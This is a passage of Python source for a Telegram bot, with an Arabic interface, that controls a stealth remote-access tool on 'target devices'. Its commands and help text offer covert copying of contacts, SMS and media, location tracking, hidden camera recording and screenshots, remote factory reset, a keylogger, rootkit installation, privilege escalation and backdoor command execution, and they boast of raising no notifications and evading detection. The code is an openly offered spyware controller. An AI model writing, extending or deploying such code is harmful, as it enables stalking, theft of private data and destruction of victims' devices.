        telebot.types.InlineKeyboardButton("⚙️ التحكم في النظام", callback_data="system_control_menu"),
        telebot.types.InlineKeyboardButton("🔧 الأدوات المتقدمة", callback_data="tools_menu"),
        telebot.types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats_menu")
    )
    
    # أزرار المساعدة والإعدادات
    markup.add(
        telebot.types.InlineKeyboardButton("❓ المساعدة", callback_data="help_menu"),
        telebot.types.InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings_menu")
    )
    
    welcome_text = f"""
🚀 **مرحباً بك في نظام التحكم عن بعد المتقدم**

👤 **المستخدم:** {message.from_user.first_name}
🆔 **الرقم:** {message.from_user.id}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **النظام جاهز للاستخدام**
📱 **اختر من القائمة أدناه:**
    """
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=markup)
    
    # تسجيل النشاط
    device_manager.log_activity(message.from_user.id, 'start_bot', 'User started the bot')
    """معالجة أمر البداية"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    # التحقق من الصلاحية
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    # التحقق من حد الطلبات
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    welcome_text = """
🎯 *مرحباً بك في نظام التحكم عن بعد المتقدم!*

🔐 *معلومات البوت:*
• المالك: أنت (ID: 985612253)
• الحالة: نشط ومتصل ومحمي بالكامل
• الأمان: تشفير AES-256-CBC + HMAC
• الاستمرارية: تعمل حتى عند انقطاع الإنترنت
• التخفي: لا تظهر أي إشعارات على الجهاز المستهدف

📋 *الأوامر المتاحة واستخداماتها:*

🔗 *أوامر الإدارة الأساسية:*
• `/start` - عرض هذه الرسالة الترحيبية الشاملة
• `/help` - دليل الاستخدام المفصل والمرجعي
• `/link` - إنشاء رابط تفعيل جديد للجهاز المستهدف
• `/devices` - عرض جميع الأجهزة المتصلة وحالتها التفصيلية

📱 *أوامر النسخ الاحتياطي والبيانات:*
• `/contacts` - نسخ احتياطي شامل لجميع جهات الاتصال
• `/sms` - نسخ احتياطي لجميع الرسائل النصية (الواردة والصادرة)
• `/media` - نسخ احتياطي للملفات الوسائطية (صور، فيديو، صوت، مستندات)

📍 *أوامر الموقع والمراقبة:*
• `/location` - الحصول على الموقع الجغرافي الدقيق والمحدث
• `/record` - تسجيل فيديو من الكاميرا (مخفي تماماً)
• `/screenshot` - التقاط لقطة شاشة فورية ومخفي

⚙️ *أوامر النظام المتقدمة:*
• `/system` - التحكم في النظام (معلومات، مراقبة، تحكم)
• `/reset` - بدء عملية إعادة تعيين المصنع (تحتاج تأكيد مزدوج)
• `/confirm_reset` - تأكيد نهائي لإعادة تعيين المصنع
• `/cancel_reset` - إلغاء عملية إعادة تعيين المصنع

🚀 *الأوامر المتقدمة الجديدة - التحكم الكامل:*
• `/advanced` - الأوامر المتقدمة للتحكم الكامل
• `/advanced system` - أوامر النظام المتقدمة
• `/advanced file` - أوامر الملفات المتقدمة
• `/advanced network` - أوامر الشبكة المتقدمة
• `/advanced security` - أوامر تجاوز الأمان
• `/advanced memory` - أوامر الذاكرة المتقدمة
• `/advanced registry` - أوامر السجل المتقدمة
• `/advanced process` - أوامر العمليات المتقدمة
• `/advanced device` - أوامر الجهاز المتقدمة

🔒 *ميزات الأمان المتقدمة:*
• تشفير AES-256-CBC لجميع البيانات المرسلة
• تحقق من صحة البيانات بـ HMAC
• تخزين محلي للأوامر عند انقطاع الإنترنت
• إعادة الاتصال التلقائي مع محاولات متعددة
• تشغيل خلفي مستمر حتى عند إغلاق التطبيق
• عدم ظهور إشعارات على الجهاز المستهدف
• حماية من محاولات الاختراق والهجمات
• تجاوز أنظمة الحماية والجدران النارية
• إخفاء العمليات والأنشطة
• تشفير متقدم للاتصالات
• حماية من الاكتشاف والكشف

💾 *ميزات الاستمرارية والموثوقية:*
• العمليات تستمر حتى عند انقطاع الإنترنت
• تخزين الأوامر المعلقة وإعادة إرسالها تلقائياً
• حفظ البيانات محلياً وإرفاقها عند العودة
• تشغيل خلفي حتى عند إغلاق المتصفح
• إعادة الاتصال الذكية مع تأخير تصاعدي
• نسخ احتياطي تلقائي للبيانات المهمة

⚠️ *تنبيهات مهمة وأمان:*
• جميع العمليات تتم بشكل مخفي تماماً
• لا تظهر أي إشعارات على الجهاز المستهدف
• البوت مخصص لك فقط ولا يمكن لأحد آخر استخدامه
• استخدم أوامر إعادة التعيين بحذر شديد
• البيانات مشفرة ومؤمنة بالكامل
• جميع العمليات مسجلة ومحفوظة

🚀 *خطوات البدء السريعة:*
1. استخدم `/link` لإنشاء رابط التفعيل
2. افتح الرابط على الجهاز المستهدف
3. أدخل كود التفعيل المقدم
4. انتظر تأكيد الربط التلقائي
5. استخدم `/devices` للتأكد من الاتصال
6. ابدأ باستخدام الأوامر المتاحة

💡 *نصائح للاستخدام الأمثل:*
• تأكد من تفعيل الجهاز المستهدف أولاً
• العمليات تستمر حتى عند انقطاع الإنترنت
• جميع البيانات مشفرة ومؤمنة
• يمكنك مراقبة العمليات من خلال السجلات
• النظام يعمل في الخلفية تلقائياً
• استخدم الأوامر بانتظام للحصول على أفضل النتائج
• استخدم `/advanced` للتحكم المتقدم والكامل
• الأوامر المتقدمة تتطلب صلاحيات إدارية عالية

🎉 *أنت جاهز للبدء! استخدم `/link` الآن لربط أول جهاز*

🔧 *للحصول على مساعدة إضافية:* استخدم `/help`
"""

    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    device_manager.log_activity(user_id, 'start_command')

@bot.message_handler(commands=['help'])
def send_help(message):
    """معالجة أمر المساعدة"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    help_text = """
📚 **دليل الاستخدام الشامل:**

🔗 **ربط جهاز جديد:**
1. استخدم `/link` لإنشاء كود تفعيل
2. افتح الرابط على الجهاز المستهدف
3. أدخل كود التفعيل
4. انتظر تأكيد الربط

📱 **التحكم في الأجهزة:**
• `/devices` - لعرض الأجهزة المتصلة
• اختر الجهاز من القائمة
• استخدم الأوامر المتاحة

🚀 **الأوامر المتقدمة الجديدة - التحكم الكامل:**
• `/advanced` - الأوامر المتقدمة للتحكم الكامل
• `/advanced system` - أوامر النظام المتقدمة
• `/advanced file` - أوامر الملفات المتقدمة
• `/advanced network` - أوامر الشبكة المتقدمة
• `/advanced security` - أوامر تجاوز الأمان
• `/advanced memory` - أوامر الذاكرة المتقدمة
• `/advanced registry` - أوامر السجل المتقدمة
• `/advanced process` - أوامر العمليات المتقدمة
• `/advanced device` - أوامر الجهاز المتقدمة

🛠️ **أوامر الخوارزميات المتطورة:**
• `/keylogger start` - بدء تسجيل المفاتيح
• `/keylogger stop` - إيقاف تسجيل المفاتيح
• `/keylogger data` - الحصول على البيانات المسجلة

🔧 **أوامر Rootkit:**
• `/rootkit install` - تثبيت Rootkit
• `/rootkit escalate` - تصعيد الصلاحيات
• `/rootkit hide` - إخفاء العمليات

🚪 **أوامر Backdoor:**
• `/backdoor create` - إنشاء Backdoor
• `/backdoor execute <command>` - تنفيذ أمر عن بعد
• `/backdoor transfer` - نقل الملفات

💻 **أوامر النظام:**
• `/system info` - معلومات النظام
• `/system control <action>` - التحكم في النظام
• `/system monitor` - مراقبة النظام

🛡️ **الأمان:**
• جميع الاتصالات مشفرة
• لا توجد إشعارات على الجهاز
• يعمل في الخلفية تلقائياً
• خوارزميات متطورة للحماية
• برمجيات متقدمة للتحكم
• تجاوز أنظمة الحماية
• إخفاء العمليات
• تشفير متقدم

⚠️ **ملاحظات مهمة:**
• تأكد من وجود الإنترنت على الجهاز
• قد تحتاج لتفعيل خيارات المطور
• بعض الأوامر تحتاج صلاحيات خاصة
• الأوامر الجديدة تتطلب تفعيل الخوارزميات أولاً
• الأوامر المتقدمة تتطلب صلاحيات إدارية عالية
"""

    bot.reply_to(message, help_text, parse_mode='Markdown')
    device_manager.log_activity(user_id, 'help_command')

@bot.message_handler(commands=['select'])
def select_device(message):
    """اختيار جهاز معين للتحكم"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # تحليل معرف الجهاز من الرسالة
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ يرجى تحديد معرف الجهاز.\nمثال: `/select DEV-123456`")
        return

    device_id = command_parts[1]
    
    # التحقق من وجود الجهاز
    devices = device_manager.get_user_devices(user_id)
    device_exists = any(device[0] == device_id for device in devices)
    
    if not device_exists:
        bot.reply_to(message, f"❌ الجهاز `{device_id}` غير موجود أو غير مرتبط بحسابك.")
        return

    # حفظ الجهاز المختار في الجلسة
    active_sessions[user_id] = {
        'selected_device': device_id,
        'timestamp': time.time()
    }
    
    bot.reply_to(message, f"✅ تم اختيار الجهاز `{device_id}` للتحكم.")
    device_manager.log_activity(user_id, 'select_device', f'device_id: {device_id}')

@bot.message_handler(commands=['link'])
def link_device(message):
    """ربط جهاز جديد - ربط تلقائي فوري"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # التحقق من عدد الأجهزة
    user_devices = device_manager.get_user_devices(user_id)
    if len(user_devices) >= SECURITY_CONFIG['max_devices_per_user']:
        bot.reply_to(message, f"⚠️ وصلت للحد الأقصى من الأجهزة ({SECURITY_CONFIG['max_devices_per_user']}).")
        return

    # توليد معرف الجهاز تلقائياً
    device_id = f"DEV-{user_id}-{int(time.time())}"
    
    # إضافة الجهاز بدون كود تفعيل (ربط تلقائي)
    if device_manager.add_device_auto(user_id, device_id):
        # الحصول على رابط Render من المتغيرات البيئية
        web_interface_url = os.environ.get('WEB_INTERFACE_URL', 'https://remote-control-web-interface.onrender.com')
        
        link_text = f"""
🔗 **رابط ربط الجهاز**

📋 **خطوات الربط:**
1. افتح هذا الرابط على الجهاز المستهدف:
   `{web_interface_url}`

2. انقر على زر "ربط الجهاز"

3. سيتم الربط تلقائياً بدون أي إشعارات

⚠️ **ملاحظات:**
• الرابط يعمل مرة واحدة فقط
• النظام يعمل في الخلفية تلقائياً
• لا تظهر أي إشعارات للمستخدم
• وضع التخفي مفعل بالكامل
        """

        bot.reply_to(message, link_text, parse_mode='Markdown')
        device_manager.log_activity(user_id, 'link_device_auto', f'device_id: {device_id}')
    else:
        bot.reply_to(message, "❌ حدث خطأ أثناء إنشاء الرابط. يرجى المحاولة مرة أخرى.")


@bot.message_handler(commands=['force_activate'])
def force_activate_devices(message):
    """إجبار تفعيل جميع الأجهزة المعلقة"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    # الحصول على جميع الأجهزة
    devices = device_manager.get_user_devices(user_id)
    
    if not devices:
        bot.reply_to(message, "📱 لا توجد أجهزة مرتبطة.\nاستخدم `/link` لربط جهاز جديد.")
        return

    activated_count = 0
    failed_count = 0
    
    for device_id, status, last_seen, device_info in devices:
        if status == 'pending':
            # محاولة إجبار تفعيل الجهاز
            if force_device_activation(device_id):
                activated_count += 1
            else:
                failed_count += 1
    
    if activated_count > 0:
        result_text = f"""
🔧 **تم إجبار تفعيل الأجهزة:**

✅ **تم تفعيل:** {activated_count} جهاز
❌ **فشل في التفعيل:** {failed_count} جهاز

📱 **يمكنك الآن استخدام الأوامر:**
• `/contacts` - نسخ جهات الاتصال
• `/sms` - نسخ الرسائل النصية
• `/media` - نسخ الوسائط
• `/location` - الحصول على الموقع
• `/screenshot` - التقاط لقطة شاشة
        """
        bot.reply_to(message, result_text, parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ فشل في تفعيل أي جهاز.\nفشل: {failed_count} جهاز")
    
    device_manager.log_activity(user_id, 'force_activate_devices', f'activated: {activated_count}, failed: {failed_count}')


@bot.message_handler(commands=['devices'])
def list_devices(message):
    """عرض الأجهزة المرتبطة"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)

    if not devices:
        bot.reply_to(message, "📱 ليس لديك أجهزة مرتبطة.\nاستخدم `/link` لربط جهاز جديد.")
        return

    devices_text = "📱 **الأجهزة المرتبطة:**\n\n"

    for i, (device_id, status, last_seen, device_info) in enumerate(devices, 1):
        status_icon = "🟢" if status == 'active' else "🔴"
        status_text = "متصل" if status == 'active' else "غير متصل"

        # تنسيق آخر ظهور
        if last_seen:
            last_seen_dt = datetime.fromisoformat(last_seen)
            time_diff = datetime.now() - last_seen_dt
            if time_diff.days > 0:
                last_seen_text = f"{time_diff.days} يوم"
            elif time_diff.seconds > 3600:
                last_seen_text = f"{time_diff.seconds // 3600} ساعة"
            else:
                last_seen_text = f"{time_diff.seconds // 60} دقيقة"
        else:
            last_seen_text = "غير معروف"

        devices_text += f"{i}. {status_icon} **{device_id}**\n"
        devices_text += f"   الحالة: {status_text}\n"
        devices_text += f"   آخر ظهور: {last_seen_text}\n\n"

    devices_text += "💡 للتحكم في جهاز معين، استخدم الأوامر مع معرف الجهاز"
    
    bot.reply_to(message, devices_text, parse_mode='Markdown')
    device_manager.log_activity(user_id, 'list_devices', f'count: {len(devices)}')


@bot.message_handler(commands=['contacts'])
def backup_contacts(message):
    """نسخ جهات الاتصال"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'backup_contacts')

    result = command_executor.send_command(device_id, 'backup_contacts')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, f"📞 جاري نسخ جهات الاتصال...\nالجهاز: {device_id} ({status})")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'backup_contacts', f'device_id: {device_id}')


@bot.message_handler(commands=['sms'])
def backup_sms(message):
    """نسخ الرسائل النصية"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'backup_sms')

    result = command_executor.send_command(device_id, 'backup_sms')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, f"💬 جاري نسخ الرسائل النصية...\nالجهاز: {device_id} ({status})")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'backup_sms', f'device_id: {device_id}')


@bot.message_handler(commands=['media'])
def backup_media(message):
    """نسخ الوسائط"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'backup_media')

    result = command_executor.send_command(device_id, 'backup_media')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, f"📸 جاري نسخ الوسائط...\nالجهاز: {device_id} ({status})\nقد يستغرق هذا وقتاً طويلاً.")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'backup_media', f'device_id: {device_id}')


@bot.message_handler(commands=['location'])
def get_location(message):
    """الحصول على الموقع"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'get_location')

    result = command_executor.send_command(device_id, 'get_location')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, f"📍 جاري الحصول على الموقع...\nالجهاز: {device_id} ({status})")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'get_location', f'device_id: {device_id}')


@bot.message_handler(commands=['record'])
def record_camera(message):
    """تسجيل الكاميرا"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'record_camera')

    # إرسال أمر التسجيل لمدة 30 ثانية
    result = command_executor.send_command(device_id, 'record_camera', {'duration': 30})

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "📹 جاري تسجيل الفيديو...\nالمدة: 30 ثانية")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'record_camera', f'device_id: {device_id}')


@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    """لقطة شاشة"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'take_screenshot')

    result = command_executor.send_command(device_id, 'take_screenshot')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "📸 جاري التقاط لقطة الشاشة...")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'take_screenshot', f'device_id: {device_id}')

@bot.message_handler(commands=['reset'])
def factory_reset(message):
    """إعادة ضبط المصنع"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']

    if not active_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
        return

    device_id = active_devices[0][0]
    command_id = device_manager.save_command(user_id, device_id, 'factory_reset')

    # تحذير قبل التنفيذ
    warning_text = f"""
⚠️ **تحذير خطير!**

هذا الأمر سيقوم بـ:
• حذف جميع البيانات من الجهاز
• إعادة ضبط الجهاز إلى إعدادات المصنع
• فقدان جميع التطبيقات والملفات

🔒 **معرف الجهاز:** `{device_id}`

هل أنت متأكد من تنفيذ هذا الأمر؟

للتنفيذ، أرسل: `/confirm_reset`
للإلغاء، أرسل: `/cancel_reset`
    """

    bot.reply_to(message, warning_text, parse_mode='Markdown')

    # حفظ في قائمة الانتظار
    command_queue[user_id] = {
        'command': 'factory_reset',
        'device_id': device_id,
        'command_id': command_id,
        'timestamp': time.time()
    }

    device_manager.log_activity(user_id, 'factory_reset_warning', f'device_id: {device_id}')

@bot.message_handler(commands=['confirm_reset'])
def confirm_reset(message):
    """تأكيد إعادة الضبط"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if user_id not in command_queue:
        bot.reply_to(message, "❌ لا توجد أوامر في قائمة الانتظار.")
        return

    pending_command = command_queue[user_id]

    if pending_command['command'] != 'factory_reset':
        bot.reply_to(message, "❌ الأمر في قائمة الانتظار ليس إعادة ضبط.")
        return

    # التحقق من انتهاء مهلة التأكيد (5 دقائق)
    if time.time() - pending_command['timestamp'] > 300:
        del command_queue[user_id]
        bot.reply_to(message, "⏰ انتهت مهلة التأكيد. يرجى إعادة الأمر.")
        return

    device_id = pending_command['device_id']
    command_id = pending_command['command_id']

    result = command_executor.send_command(device_id, 'factory_reset')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "🔄 تم بدء إعادة ضبط المصنع...\n⚠️ سيتم فقدان جميع البيانات!")
        device_manager.update_command_result(command_id, 'sent')

    del command_queue[user_id]
    device_manager.log_activity(user_id, 'factory_reset_confirmed', f'device_id: {device_id}')

@bot.message_handler(commands=['cancel_reset'])
def cancel_reset(message):
    """إلغاء إعادة الضبط"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if user_id in command_queue:
        del command_queue[user_id]
        bot.reply_to(message, "✅ تم إلغاء إعادة الضبط.")
        device_manager.log_activity(user_id, 'factory_reset_cancelled')
    else:
        bot.reply_to(message, "❌ لا توجد أوامر في قائمة الانتظار.")


@bot.message_handler(commands=['keylogger'])
def control_keylogger(message):
    """التحكم في خوارزمية تسجيل المفاتيح"""
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return

    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
